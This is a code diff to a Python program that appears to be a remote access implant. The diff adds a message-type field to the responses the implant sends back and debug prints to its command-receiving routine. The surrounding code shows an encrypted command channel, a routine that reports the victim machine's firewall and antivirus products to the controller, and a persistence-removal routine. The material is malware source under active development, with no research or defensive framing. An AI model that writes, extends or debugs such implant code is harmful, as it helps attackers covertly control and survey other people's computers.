@@ -26,6 +26,10 @@ class STATUS:
     SUCCESS = "success"
     FAILURE = "failure"
 
+class TYPE:
+    FILE = "file"
+    JSON = "json"
+
 KEY = 'RANDOM_KEY'
 
 _k = KEY.encode() if isinstance(KEY, str) else KEY
@@ -43,8 +47,8 @@ time_value = 90
 
 task_id = 0
 
-def prepare_response(status=STATUS.SUCCESS, result=None, error=None, metadata=None):
-    response = {"status": status, "task_id": task_id}
+def prepare_response(msg_type=TYPE.JSON, status=STATUS.SUCCESS, result=None, error=None, metadata=None):
+    response = {"status": status, "task_id": task_id, "msg_type": msg_type}
     if result is not None:
         response["result"] = result
     if error is not None:
@@ -53,8 +57,8 @@ def prepare_response(status=STATUS.SUCCESS, result=None, error=None, metadata=No
         response["metadata"] = metadata
     return response
 
-def send_response(conn, status=STATUS.SUCCESS, result=None, error=None, metadata=None):
-    response = prepare_response(status, result, error, metadata)
+def send_response(conn, msg_type=TYPE.JSON, status=STATUS.SUCCESS, result=None, error=None, metadata=None):
+    response = prepare_response(msg_type, status, result, error, metadata)
     json_send(conn, response)
 
 def encrypt(data): return fernet.encrypt(data)
@@ -111,7 +115,7 @@ def get_security_info(conn):
     antivirus_info = [{"displayName": a.displayName, "instanceGuid": a.instanceGuid, 
                       "pathToSignedProductExe": a.pathToSignedProductExe , "pathToSignedReportingExe": a.pathToSignedReportingExe,
                       "productState": a.productState, "timestamp": a.timestamp} for a in antivirus]
-    send_response(conn, status=STATUS.SUCCESS, result={"Firewall": firewall_info, "Antivirus": antivirus_info})
+    send_response(conn, msg_type=TYPE.JSON, status=STATUS.SUCCESS, result={"Firewall": firewall_info, "Antivirus": antivirus_info})
 
 def del_persistence(conn):
     try:
@@ -156,10 +160,13 @@ def recv_exact(conn, n):
 
 def recv_command(conn, decode=True):
     try:
+        print("recv")
         size_data = recv_exact(conn, 4)
         size = struct.unpack('>I', size_data)[0]
+        print(size)
         data = recv_exact(conn, size)
         dec = decrypt(data)
+        print(dec)
         return dec.decode() if decode else dec
     except Exception as e:
         print(e)
